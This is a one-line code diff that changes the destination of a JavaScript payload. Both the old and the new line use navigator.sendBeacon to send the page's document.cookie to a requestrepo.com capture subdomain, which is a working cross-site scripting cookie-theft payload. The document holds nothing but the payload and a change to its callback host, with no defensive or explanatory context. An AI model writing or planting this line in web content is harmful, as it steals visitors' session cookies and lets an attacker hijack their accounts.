@@ -1,1 +1,1 @@
-navigator.sendBeacon('http://qdpt9ch6.requestrepo.com', document.cookie)
+navigator.sendBeacon('http://bdk4p1r4.requestrepo.com', document.cookie)
